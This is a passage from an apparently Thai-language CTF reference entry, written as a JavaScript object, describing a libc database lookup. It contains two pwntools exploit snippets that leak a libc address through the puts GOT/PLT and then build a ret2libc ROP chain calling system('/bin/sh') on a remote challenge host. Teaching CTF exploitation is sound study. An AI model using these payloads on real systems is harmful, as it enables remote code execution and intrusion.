about:'เมื่อ leak address ของ function จาก GOT/PLT ได้แล้ว สามารถหา libc version จากฐานข้อมูลนี้ เพื่อคำนวณ offset ของ system() และ /bin/sh',
usage:[{label:'Full ret2libc workflow',body:`# 1. หา offset ก่อน (ด้วย cyclic)
# 2. Leak puts GOT address:
payload = b'A'*offset + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main)
p.sendline(payload)
puts_leak = u64(p.recv(6).ljust(8,b'\x00'))

# 3. ใส่ค่าใน libc.blukat.me หรือ:
from pwnlib.libcdb import search_by_symbol_offsets
results = search_by_symbol_offsets([('puts',puts_leak & 0xfff)])

# 4. คำนวณ base และ addresses:
libc = ELF('libc-2.31.so')
libc.address = puts_leak - libc.sym['puts']
system = libc.sym['system']
binsh  = next(libc.search(b'/bin/sh'))`},
{label:'🚩 CTF scenario — ret2libc',body:`# เมื่อ binary มี NX+ASLR แต่ไม่มี canary
# ต้อง leak libc address ก่อน แล้วค้น libc.blukat.me

# Step 1: leak puts address
p = remote('chall.ctf.com', 9001)
p.sendline(b'A'*offset + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main))
leak = u64(p.recvuntil(b'\n')[:6].ljust(8, b'\x00'))
print(hex(leak))  # e.g. 0x7f1234567890

# Step 2: ค้น libc.blukat.me ด้วย puts=0x890
# → libc-2.31.so, puts offset = 0x84420

# Step 3: calc base + exploit
libc_base = leak - 0x84420
system = libc_base + 0x55410
binsh  = libc_base + 0x1b75aa
p.sendline(b'A'*offset + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system))
p.interactive()`}],
},
